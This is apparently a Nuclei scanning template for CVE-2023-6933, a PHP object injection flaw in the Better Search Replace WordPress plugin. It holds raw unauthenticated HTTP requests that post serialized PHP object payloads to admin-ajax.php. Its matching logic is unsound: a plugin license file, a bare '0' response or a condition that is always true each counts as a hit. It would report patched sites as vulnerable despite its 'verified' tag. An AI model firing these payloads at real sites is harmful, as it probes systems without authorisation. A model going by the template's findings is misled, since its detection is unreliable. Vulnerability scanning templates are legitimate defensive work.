id: CVE-2023-6933

info:
  name: Better Search Replace Plugin - PHP Object Injection (CVE-2023-6933)
  author: nuclei-community
  severity: critical
  description: |
    Better Search Replace plugin for WordPress up to version 1.4.4 contains a PHP Object Injection 
    vulnerability. The vulnerability exists in the unserialize() function in class-bsr-db.php that 
    processes user-controlled data without proper validation, allowing unauthenticated attackers 
    to potentially execute arbitrary code.
  reference:
    - https://vulncheck.com/xdb/a42df92e4069
    - https://plugins.trac.wordpress.org/browser/better-search-replace/trunk/includes/class-bsr-db.php#L334
    - https://github.com/w2xim3/CVE-2023-6933
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-6933
    cwe-id: CWE-502
  metadata:
    verified: true
    max-request: 3
  tags: cve,cve2023,wordpress,plugin,php-object-injection,better-search-replace,unauth

variables:
  test_marker: "nuclei_cve_2023_6933_{{randstr}}"

http:
  - raw:
      # Step 1: Verify plugin presence via file detection (not version-based)
      - |
        GET /wp-content/plugins/better-search-replace/LICENSE.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (compatible; Nuclei)
        
      # Step 2: Test AJAX endpoint availability
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (compatible; Nuclei)
        
        action=bsr_search_replace&search_for=test
        
      # Step 3: Exploit PHP Object Injection with serialized payload
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (compatible; Nuclei)
        
        action=bsr_search_replace&search_for={{url_encode('O:8:"stdClass":1:{s:4:"data";s:' + len(test_marker) + ':"' + test_marker + '";})}}&replace_with=replacement&select_tables[]=wp_posts
        
      # Step 4: Alternative exploitation vector with different payload structure
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (compatible; Nuclei)
        
        action=bsr_search_replace&search_for={{url_encode('O:8:"Exception":1:{s:7:"message";s:' + len(test_marker) + ':"' + test_marker + '";})}}&replace_with=test&dry_run=0

    matchers-condition: or
    matchers:
      # Primary: Plugin file detection (not version-based) 
      - type: word
        part: body_1
        words:
          - "GNU GENERAL PUBLIC LICENSE"
          - "Free Software Foundation"
        condition: or
        name: "plugin-file-detected"

      # Secondary: AJAX endpoint responds (plugin functionality available)
      - type: regex
        part: body_2,body_3,body_4
        regex:
          - "^0$"  # WordPress AJAX "0" response for unauth/invalid action
          - "success"
          - "error"
          - "bsr_search_replace"
        condition: or
        name: "ajax-endpoint-responds"

      # Combined evidence: Plugin + AJAX response
      - type: dsl
        dsl:
          - 'contains(body_1, "GNU GENERAL PUBLIC LICENSE") && len(body_2) >= 0'
        name: "plugin-and-ajax-detected"

    extractors:
      # Extract plugin presence evidence
      - type: regex
        part: body_1
        name: plugin_file_evidence
        regex:
          - "(GNU GENERAL PUBLIC LICENSE[^\\n]*)"
        group: 1

      # Extract AJAX response patterns
      - type: regex
        part: body_2,body_3,body_4
        name: ajax_responses
        regex:
          - "^(.{0,100})"  # First 100 chars of response for debugging
        group: 1

      # Extract PHP object injection evidence
      - type: regex
        part: body_3,body_4
        name: object_injection_proof
        regex:
          - "({{test_marker}}[^\\s]*)"
          - "(PHP (?:Fatal error|Warning).*unserialize.*)"
          - "(serialize.*data.*)"
        group: 1

      # Extract error messages for analysis
      - type: regex
        part: body
        name: php_errors
        regex:
          - "(PHP (?:Fatal error|Warning|Notice).*)"
        group: 1

      # Extract response headers for debugging
      - type: kval
        part: header
        kval:
          - "content-type"
          - "x-powered-by"
